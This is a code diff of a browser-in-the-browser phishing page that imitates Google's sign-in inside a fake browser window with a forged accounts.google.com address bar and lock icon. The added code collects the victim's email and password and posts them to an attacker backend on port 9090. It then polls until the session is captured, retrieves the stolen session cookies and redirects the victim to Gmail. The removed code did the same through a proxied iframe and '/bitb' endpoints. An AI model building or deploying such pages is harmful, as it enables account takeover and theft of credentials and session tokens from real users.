@@ -3,12 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Sign-In</title>
+<title>Sign in - Google Accounts</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;overflow:hidden}
+body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif;overflow:hidden}
 .desktop-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,#16213e 0%,#0f0f1a 100%);z-index:0}
-.browser{position:relative;z-index:1;width:900px;max-width:95vw;height:680px;max-height:90vh;background:#fff;border-radius:12px;box-shadow:0 25px 60px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.08);display:flex;flex-direction:column;overflow:hidden}
+
+.browser{position:relative;z-index:1;width:920px;max-width:95vw;height:720px;max-height:92vh;background:#fff;border-radius:12px;box-shadow:0 25px 60px rgba(0,0,0,.5);display:flex;flex-direction:column;overflow:hidden}
 .title-bar{display:flex;align-items:center;padding:10px 16px;background:#f0f0f0;border-bottom:1px solid #d0d0d0;flex-shrink:0}
 .window-dots{display:flex;gap:8px;margin-right:16px}
 .dot{width:13px;height:13px;border-radius:50%}
@@ -17,39 +18,64 @@ body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;m
 .dot.green{background:#28c840;border:1px solid #1aab2f}
 .title-text{font-size:13px;color:#555;flex:1;text-align:center;user-select:none}
 .url-bar{display:flex;align-items:center;gap:10px;padding:8px 14px;background:#f5f5f5;border-bottom:1px solid #e0e0e0;flex-shrink:0}
-.nav-btn{width:28px;height:28px;border-radius:6px;border:none;background:transparent;color:#666;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:13px}
+.nav-btn{width:28px;height:28px;border-radius:6px;border:none;background:transparent;color:#666;cursor:pointer;font-size:13px}
 .nav-btn:hover{background:#e0e0e0}
-.nav-btn:disabled{opacity:.3;cursor:default}
 .url-input{flex:1;padding:6px 14px;border:1px solid #d0d0d0;border-radius:20px;font-size:13px;background:#fff;outline:none;color:#1a73e8;font-weight:500;text-overflow:ellipsis;overflow:hidden;white-space:nowrap}
 .lock-icon{color:#666;font-size:13px;margin-right:-6px}
-.content{flex:1;position:relative;background:#fff;overflow:hidden}
-.content iframe{width:100%;height:100%;border:none;display:block}
-.loading{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#fff;z-index:10;transition:opacity .4s}
-.loading.hidden{opacity:0;pointer-events:none}
-.loading-spinner{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.loading-text{margin-top:14px;font-size:14px;color:#666}
-.loading-sub{font-size:12px;color:#999;margin-top:6px}
-.security-badge{position:absolute;bottom:12px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.75);color:#fff;padding:6px 14px;border-radius:20px;font-size:11px;display:flex;align-items:center;gap:6px;z-index:5;pointer-events:none;backdrop-filter:blur(4px)}
+
+.content{flex:1;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;background:#fff}
+.card{width:448px;padding:48px 40px 36px;display:flex;flex-direction:column;align-items:center}
+.logo svg{width:75px;height:24px;display:block}
+.card-title{font-size:24px;font-weight:400;color:#202124;margin:16px 0 8px}
+.card-sub{font-size:14px;color:#5f6368;margin-bottom:30px;text-align:center}
+#userEmailDisplay{font-size:14px;color:#5f6368;margin-bottom:24px;font-weight:500;text-align:center}
+.inp{width:100%;margin-bottom:4px}
+.inp input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;color:#202124;font-family:inherit}
+.inp input:focus{border-color:#1a73e8}
+.inp input::placeholder{color:#5f6368;opacity:1}
+.err{width:100%;font-size:12px;color:#d32f2f;margin:0 0 0 2px;display:none}
+.hint{width:100%;font-size:12px;color:#5f6368;margin:4px 0 0}
+.btn-row{width:100%;display:flex;justify-content:space-between;align-items:center;margin-top:24px}
+.btn-row a{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;cursor:pointer;padding:4px 8px;border-radius:4px}
+.btn-row a:hover{background:#f0f5ff}
+.btn-next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:9px 24px;font-size:14px;font-weight:500;cursor:pointer;min-width:88px;font-family:inherit}
+.btn-next:hover{background:#1557b0}
+.btn-next:disabled{background:#ccc;cursor:default}
+.footer-row{width:100%;display:flex;justify-content:space-between;margin-top:40px;font-size:12px}
+.footer-row a{color:#5f6368;text-decoration:none;font-size:12px}
+.footer-row a:hover{color:#1a73e8}
+.footer-row select{border:none;font-size:12px;color:#5f6368;cursor:pointer;outline:none;font-family:inherit}
+.pw-toggle{font-size:12px;color:#1a73e8;cursor:pointer;margin-top:2px;user-select:none;width:100%;text-align:left}
+.pw-toggle:hover{text-decoration:underline}
+
+#loadingBar{position:absolute;top:0;left:0;width:100%;height:3px;background:#e0e0e0;z-index:10;display:none}
+#loadingFill{height:100%;background:#1a73e8;width:0%;animation:loadAnim 2s ease-in-out infinite}
+@keyframes loadAnim{0%{width:0%}50%{width:70%}100%{width:100%}}
+#loadingBar.active{display:block}
+#loadingMsg{font-size:13px;color:#666;text-align:center;width:100%;margin-top:8px;display:none}
+#loadingMsg.show{display:block}
+.loading-dots:after{content:'.';animation:dots 1.5s steps(4) infinite}
+@keyframes dots{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}}
+
 #statusOverlay{position:absolute;top:0;left:0;width:100%;height:100%;display:none;flex-direction:column;align-items:center;justify-content:center;background:#fff;z-index:20;text-align:center;padding:40px}
 #statusOverlay.show{display:flex}
 .status-icon{font-size:48px;margin-bottom:16px}
 .status-title{font-size:22px;font-weight:600;color:#222;margin-bottom:8px}
 .status-desc{font-size:14px;color:#666;max-width:400px;line-height:1.5}
-.status-cookies{margin-top:20px;text-align:left;width:100%;max-width:500px;max-height:200px;overflow-y:auto;background:#f8f8f8;border-radius:8px;padding:12px}
-.status-cookies table{width:100%;font-size:12px;border-collapse:collapse}
-.status-cookies th{text-align:left;padding:4px 8px;background:#eee;font-weight:600}
-.status-cookies td{padding:4px 8px;border-bottom:1px solid #eee;word-break:break-all;max-width:200px;overflow:hidden;text-overflow:ellipsis}
-.redirect-btn{margin-top:20px;padding:10px 30px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer}
+.cookie-box{margin-top:20px;text-align:left;width:100%;max-width:540px;max-height:220px;overflow-y:auto;background:#f8f8f8;border-radius:8px;padding:12px}
+.cookie-box table{width:100%;font-size:11px;border-collapse:collapse}
+.cookie-box th{text-align:left;padding:4px 8px;background:#eee;font-weight:600;position:sticky;top:0}
+.cookie-box td{padding:4px 8px;border-bottom:1px solid #eee;word-break:break-all;max-width:200px;overflow:hidden;text-overflow:ellipsis;font-size:11px}
+.redirect-btn{margin-top:20px;padding:10px 40px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer;font-family:inherit}
 .redirect-btn:hover{background:#1557b0}
-#progressBar{margin-top:16px;width:280px;height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden}
-#progressFill{height:100%;background:#1a73e8;border-radius:2px;width:0%;transition:width .5s}
+.error-shake{animation:shake .3s}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
 </style>
 </head>
 <body>
 <div class="desktop-bg"></div>
 
-<div class="browser" id="browser">
+<div class="browser">
   <div class="title-bar">
     <div class="window-dots">
       <div class="dot red"></div>
@@ -60,169 +86,230 @@ body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;m
   </div>
 
   <div class="url-bar">
-    <button class="nav-btn" id="backBtn" disabled>&#8592;</button>
-    <button class="nav-btn" id="fwdBtn" disabled>&#8594;</button>
+    <button class="nav-btn" disabled>&#8592;</button>
+    <button class="nav-btn" disabled>&#8594;</button>
     <button class="nav-btn" id="refreshBtn">&#8635;</button>
     <span class="lock-icon">&#128274;</span>
-    <div class="url-input" id="urlDisplay">https://accounts.google.com/signin/v2/identifier</div>
+    <div class="url-input" id="urlDisplay">https://accounts.google.com</div>
   </div>
 
-  <div class="content" id="contentArea">
-    <div class="loading" id="loadingOverlay">
-      <div class="loading-spinner"></div>
-      <div class="loading-text" id="loadingText">Establishing secure connection...</div>
-      <div class="loading-sub" id="loadingSub">Contacting Google servers</div>
-    </div>
-    <iframe id="loginFrame" name="loginFrame" sandbox="allow-scripts allow-forms allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation" allow="camera;microphone;publickey-credentials-get"></iframe>
-    
-    <div id="statusOverlay">
-      <div class="status-icon" id="statusIcon">&#9989;</div>
-      <div class="status-title" id="statusTitle">Sign in successful</div>
-      <div class="status-desc" id="statusDesc">Your session has been verified. You will be redirected shortly.</div>
-      <div id="progressBar"><div id="progressFill"></div></div>
-      <div class="status-cookies" id="cookieList" style="display:none"></div>
-      <button class="redirect-btn" id="redirectBtn" onclick="redirectToGmail()">Continue to Gmail</button>
+  <div class="content">
+    <div id="loadingBar"><div id="loadingFill"></div></div>
+    <div id="loadingMsg"></div>
+
+    <!-- Email card -->
+    <div class="card" id="emailCard">
+      <div class="logo">
+        <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M67.54 12.1c0-1.1-.1-2.16-.28-3.17H37.3v6.01h17.02a7.13 7.13 0 0 1-3.1 4.68v3.88h5.01c2.93-2.7 4.63-6.67 4.63-11.4z"/><path fill="#34A853" d="M37.3 24c4.2 0 7.72-1.39 10.3-3.78l-5.02-3.88c-1.39.93-3.17 1.48-5.28 1.48-4.06 0-7.5-2.74-8.73-6.43h-5.18v4.01A15.57 15.57 0 0 0 37.3 24z"/><path fill="#FBBC05" d="M28.57 14.39a9.3 9.3 0 0 1-.49-2.97c0-1.04.18-2.05.49-2.97V4.44h-5.18a15.58 15.58 0 0 0 0 13.96l5.18-4.01z"/><path fill="#EA4335" d="M37.3 4.68c2.28 0 4.33.78 5.94 2.32l4.46-4.46C44.99.98 41.48 0 37.3 0A15.57 15.57 0 0 0 23.39 8.06l5.18 4.01c1.23-3.7 4.67-6.44 8.73-6.44z"/></svg>
+      </div>
+      <div class="card-title">Sign in</div>
+      <div class="card-sub">to continue to Gmail</div>
+      <div class="inp">
+        <input type="text" id="emailInput" placeholder="Email or phone" autocomplete="off" autocapitalize="none" spellcheck="false">
+      </div>
+      <div class="err" id="emailError">Please enter a valid email address</div>
+      <div class="btn-row">
+        <a href="#">Create account</a>
+        <button class="btn-next" id="nextBtn">Next</button>
+      </div>
+      <div class="footer-row">
+        <select><option>English (United States)</option><option>Deutsch</option><option>Español</option></select>
+        <div><a href="#">Help</a>&nbsp;&nbsp;<a href="#">Privacy</a>&nbsp;&nbsp;<a href="#">Terms</a></div>
+      </div>
     </div>
 
-    <div class="security-badge">
-      <span>&#10004;</span> Connection is secure
+    <!-- Password card -->
+    <div class="card" id="passwordCard" style="display:none">
+      <div class="logo">
+        <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M67.54 12.1c0-1.1-.1-2.16-.28-3.17H37.3v6.01h17.02a7.13 7.13 0 0 1-3.1 4.68v3.88h5.01c2.93-2.7 4.63-6.67 4.63-11.4z"/><path fill="#34A853" d="M37.3 24c4.2 0 7.72-1.39 10.3-3.78l-5.02-3.88c-1.39.93-3.17 1.48-5.28 1.48-4.06 0-7.5-2.74-8.73-6.43h-5.18v4.01A15.57 15.57 0 0 0 37.3 24z"/><path fill="#FBBC05" d="M28.57 14.39a9.3 9.3 0 0 1-.49-2.97c0-1.04.18-2.05.49-2.97V4.44h-5.18a15.58 15.58 0 0 0 0 13.96l5.18-4.01z"/><path fill="#EA4335" d="M37.3 4.68c2.28 0 4.33.78 5.94 2.32l4.46-4.46C44.99.98 41.48 0 37.3 0A15.57 15.57 0 0 0 23.39 8.06l5.18 4.01c1.23-3.7 4.67-6.44 8.73-6.44z"/></svg>
+      </div>
+      <div class="card-title" id="pwTitle">Welcome</div>
+      <div id="userEmailDisplay"></div>
+      <div class="inp">
+        <input type="password" id="passwordInput" placeholder="Enter your password" autocomplete="off">
+      </div>
+      <div class="hint">Use your Google Account password</div>
+      <div class="pw-toggle" id="showPwToggle">Show password</div>
+      <div class="err" id="pwError">Wrong password. Try again.</div>
+      <div class="btn-row">
+        <a href="#">Forgot password?</a>
+        <button class="btn-next" id="pwNextBtn">Next</button>
+      </div>
+      <div class="footer-row">
+        <select><option>English (United States)</option><option>Deutsch</option><option>Español</option></select>
+        <div><a href="#">Help</a>&nbsp;&nbsp;<a href="#">Privacy</a>&nbsp;&nbsp;<a href="#">Terms</a></div>
+      </div>
+    </div>
+
+    <!-- Success overlay -->
+    <div id="statusOverlay">
+      <div class="status-icon">&#9989;</div>
+      <div class="status-title">Sign in successful</div>
+      <div class="status-desc">Your session has been verified.</div>
+      <div class="cookie-box" id="cookieList" style="display:none"></div>
+      <button class="redirect-btn" onclick="goGmail()">Continue to Gmail</button>
     </div>
   </div>
 </div>
 
 <script>
 (function(){
-  var currentUrl = new URL(window.location.href);
-  var loginPath = '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin';
-  var iframeSrc = currentUrl.origin + loginPath;
+  var ei = document.getElementById('emailInput');
+  var pi = document.getElementById('passwordInput');
+  var nb = document.getElementById('nextBtn');
+  var pb = document.getElementById('pwNextBtn');
+  var ec = document.getElementById('emailCard');
+  var pc = document.getElementById('passwordCard');
+  var ud = document.getElementById('userEmailDisplay');
+  var lb = document.getElementById('loadingBar');
+  var lm = document.getElementById('loadingMsg');
+  var so = document.getElementById('statusOverlay');
+  var cl = document.getElementById('cookieList');
+  var sid = '{session_id}';
+  var apiBase = window.location.protocol + '//' + window.location.hostname + ':9090';
 
-  var iframe = document.getElementById('loginFrame');
-  var loading = document.getElementById('loadingOverlay');
-  var loadingText = document.getElementById('loadingText');
-  var loadingSub = document.getElementById('loadingSub');
-  var urlDisplay = document.getElementById('urlDisplay');
-  var statusOverlay = document.getElementById('statusOverlay');
+  function gS() { return sid; }
+  function apiUrl(p) { return apiBase + '/' + p; }
 
-  function setLoading(text, sub) {
-    loading.classList.remove('hidden');
-    loadingText.textContent = text || 'Loading...';
-    loadingSub.textContent = sub || '';
+  function ld(t) { lb.classList.add('active'); if (t) { lm.textContent = t; lm.classList.add('show'); } }
+  function hd() { lb.classList.remove('active'); lm.classList.remove('show'); }
+
+  function se() {
+    var e = ei.value.trim();
+    if (!e || !e.includes('@') || !e.includes('.')) {
+      document.getElementById('emailError').style.display = 'block';
+      ei.classList.add('error-shake');
+      setTimeout(function(){ei.classList.remove('error-shake');}, 300);
+      return;
+    }
+    document.getElementById('emailError').style.display = 'none';
+    var s = gS();
+    if (!s) { document.getElementById('emailError').textContent = 'Session error. Refresh.'; document.getElementById('emailError').style.display = 'block'; return; }
+
+    ld('Signing in<span class="loading-dots"></span>');
+    nb.disabled = true;
+
+    fetch(apiUrl('email'), { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sessionId:s, email:e}) })
+    .then(function(r){return r.json()})
+    .then(function(d){
+      if (d.status === 'password_needed') { hd(); nb.disabled = false; showPw(e); return; }
+      pollPw(s, e);
+    })
+    .catch(function(){ hd(); nb.disabled = false; document.getElementById('emailError').textContent = 'Connection error. Try again.'; document.getElementById('emailError').style.display = 'block'; });
   }
 
-  function hideLoading() {
-    loading.classList.add('hidden');
+  function pollPw(s, e) {
+    ld('Processing<span class="loading-dots"></span>');
+    var w = 0;
+    var iv = setInterval(function(){
+      fetch(apiUrl('status/'+encodeURIComponent(s)))
+      .then(function(r){return r.json()})
+      .then(function(d){
+        if (d.status === 'password_needed') { clearInterval(iv); hd(); showPw(e); }
+        else if (d.status === 'failed') { clearInterval(iv); hd(); document.getElementById('emailError').textContent = d.error || 'Login failed'; document.getElementById('emailError').style.display = 'block'; }
+      }).catch(function(){});
+      w += 1500;
+      if (w > 30000) { clearInterval(iv); hd(); showPw(e); }
+    }, 1500);
   }
 
-  function updateUrl(url) {
-    try {
-      var u = new URL(url);
-      urlDisplay.textContent = 'https://accounts.google.com' + u.pathname + u.search + u.hash;
-    } catch(e) {}
+  function showPw(e) {
+    ud.textContent = e;
+    ec.style.display = 'none';
+    pc.style.display = 'flex';
+    setTimeout(function(){pi.focus();}, 100);
   }
 
-  iframe.addEventListener('load', function() {
-    hideLoading();
-    try {
-      var src = iframe.contentWindow.location.href;
-      if (src) updateUrl(src);
-    } catch(e) {}
+  function sp() {
+    var p = pi.value;
+    if (!p) {
+      document.getElementById('pwError').style.display = 'block';
+      pi.classList.add('error-shake');
+      setTimeout(function(){pi.classList.remove('error-shake');}, 300);
+      return;
+    }
+    document.getElementById('pwError').style.display = 'none';
+    var s = gS();
+    if (!s) { document.getElementById('pwError').textContent = 'Session error. Refresh.'; document.getElementById('pwError').style.display = 'block'; return; }
+
+    ld('Verifying password<span class="loading-dots"></span>');
+    pb.disabled = true;
+
+    fetch(apiUrl('password'), { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sessionId:s, password:p}) })
+    .then(function(r){return r.json()})
+    .then(function(d){
+      if (d.status === 'submitted') { pollDone(s); }
+      else { hd(); pb.disabled = false; }
+    })
+    .catch(function(){ hd(); pb.disabled = false; document.getElementById('pwError').textContent = 'Connection error. Try again.'; document.getElementById('pwError').style.display = 'block'; });
+  }
+
+  function pollDone(s) {
+    var w = 0;
+    var iv = setInterval(function(){
+      fetch(apiUrl('status/'+encodeURIComponent(s)))
+      .then(function(r){return r.json()})
+      .then(function(d){
+        if (d.status === 'complete') {
+          clearInterval(iv); hd(); pb.disabled = false;
+          fetch(apiUrl('cookies/'+encodeURIComponent(s)))
+          .then(function(r){return r.json()})
+          .then(function(c){showOK(c.cookies||[]);})
+          .catch(function(){showOK([]);});
+        } else if (d.status === 'failed') {
+          clearInterval(iv); hd(); pb.disabled = false;
+          document.getElementById('pwError').textContent = d.error || 'Login failed';
+          document.getElementById('pwError').style.display = 'block';
+        }
+      }).catch(function(){});
+      w += 2000;
+      if (w > 60000) { clearInterval(iv); hd(); pb.disabled = false; showOK([]); }
+    }, 2000);
+  }
+
+  function showOK(c) {
+    so.classList.add('show');
+    if (c && c.length > 0) {
+      cl.style.display = 'block';
+      var h = '<table><thead><tr><th>Name</th><th>Domain</th><th>Value</th></tr></thead><tbody>';
+      c.slice(0, 30).forEach(function(x){
+        var v = x.value||'';
+        h += '<tr><td>'+esc(x.name)+'</td><td>'+esc(x.domain||'')+'</td><td title="'+esc(v)+'">'+esc(v.substring(0,35))+(v.length>35?'...':'')+'</td></tr>';
+      });
+      h += '</tbody></table>';
+      cl.innerHTML = h;
+    }
+    setTimeout(goGmail, 5000);
+  }
+
+  function goGmail() { window.location.href = 'https://mail.google.com/mail/u/0/'; }
+  function esc(s) { return !s ? '' : s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+  nb.addEventListener('click', se);
+  ei.addEventListener('keydown', function(e){if(e.key==='Enter')se();});
+  pb.addEventListener('click', sp);
+  pi.addEventListener('keydown', function(e){if(e.key==='Enter')sp();});
+  document.getElementById('showPwToggle').addEventListener('click', function(){
+    if (pi.type==='password'){pi.type='text';this.textContent='Hide password';}
+    else{pi.type='password';this.textContent='Show password';}
+  });
+  document.getElementById('refreshBtn').addEventListener('click', function(){
+    ei.value=''; pi.value=''; ec.style.display='flex'; pc.style.display='none'; so.classList.remove('show'); hd();
   });
 
-  setLoading('Establishing secure connection...', 'Contacting Google servers');
-  iframe.src = iframeSrc;
-
-  function showSuccess(cookies) {
-    statusOverlay.classList.add('show');
-    document.getElementById('statusIcon').innerHTML = '&#9989;';
-    document.getElementById('statusTitle').textContent = 'Sign in successful';
-    document.getElementById('statusDesc').textContent = 'Your session has been verified. ' + (cookies ? cookies.length + ' session tokens captured.' : 'Redirecting...');
-
-    var pb = document.getElementById('progressFill');
-    pb.style.width = '0%';
-    var p = 0;
-    var pi = setInterval(function() {
-      p += 2;
-      pb.style.width = Math.min(p, 100) + '%';
-      if (p >= 100) clearInterval(pi);
-    }, 100);
-
-    if (cookies && cookies.length > 0) {
-      var cl = document.getElementById('cookieList');
-      cl.style.display = 'block';
-      var html = '<table><thead><tr><th>Name</th><th>Domain</th><th>Value</th></tr></thead><tbody>';
-      cookies.slice(0, 20).forEach(function(c) {
-        var val = c.value || '';
-        html += '<tr><td>' + escapeHtml(c.name) + '</td><td>' + escapeHtml(c.domain || '') + '</td><td title="' + escapeHtml(val) + '">' + escapeHtml(val.substring(0, 40)) + (val.length > 40 ? '...' : '') + '</td></tr>';
-      });
-      html += '</tbody></table>';
-      cl.innerHTML = html;
-    }
-
-    setTimeout(redirectToGmail, 5000);
-  }
-
-  function showError(msg) {
-    statusOverlay.classList.add('show');
-    document.getElementById('statusIcon').innerHTML = '&#10060;';
-    document.getElementById('statusTitle').textContent = 'Sign in failed';
-    document.getElementById('statusDesc').textContent = msg || 'An error occurred. Please try again.';
-    document.getElementById('progressBar').style.display = 'none';
-  }
-
-  function redirectToGmail() {
-    window.location.href = 'https://mail.google.com/mail/u/0/';
-  }
-
-  function escapeHtml(s) {
-    if (!s) return '';
-    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-  }
-
-  // Poll for BITB status
-  var pollInterval = setInterval(function() {
-    var sid = getSessionId();
-    if (!sid) return;
-
-    fetch('/bitb/status/' + encodeURIComponent(sid))
-      .then(function(r) { return r.json(); })
-      .then(function(data) {
-        if (data.status === 'complete') {
-          clearInterval(pollInterval);
-          fetch('/bitb/cookies/' + encodeURIComponent(sid))
-            .then(function(r) { return r.json(); })
-            .then(function(cd) {
-              showSuccess(cd.cookies || []);
-            })
-            .catch(function() { showSuccess([]); });
-        } else if (data.status === 'logging_in') {
-          setLoading('Signing in...', 'Completing authentication');
-        } else if (data.status === 'failed') {
-          clearInterval(pollInterval);
-          showError(data.error || 'Login failed');
-        }
-      })
-      .catch(function() {});
-  }, 2000);
-
-  function getSessionId() {
-    try {
-      var c = document.cookie.split(';');
-      for (var i = 0; i < c.length; i++) {
-        var parts = c[i].split('=');
-        if (parts[0].trim().endsWith('_sid')) return parts[1].trim();
-        if (parts[0].trim() === 'sid') return parts[1].trim();
+  setInterval(function(){
+    var s=gS(); if(!s||so.classList.contains('show'))return;
+    fetch(apiUrl('status/'+encodeURIComponent(s)))
+    .then(function(r){return r.json()})
+    .then(function(d){
+      if(d.status==='complete'){
+        fetch(apiUrl('cookies/'+encodeURIComponent(s)))
+        .then(function(r){return r.json()})
+        .then(function(c){showOK(c.cookies||[]);})
+        .catch(function(){showOK([]);});
       }
-    } catch(e) {}
-    return null;
-  }
-
-  // Fallback: after 30s show success anyway (proxy captured cookies)
-  setTimeout(function() {
-    if (!statusOverlay.classList.contains('show')) {
-      clearInterval(pollInterval);
-      showSuccess([]);
-    }
-  }, 30000);
+    }).catch(function(){});
+  }, 3000);
 })();
 </script>
 </body>
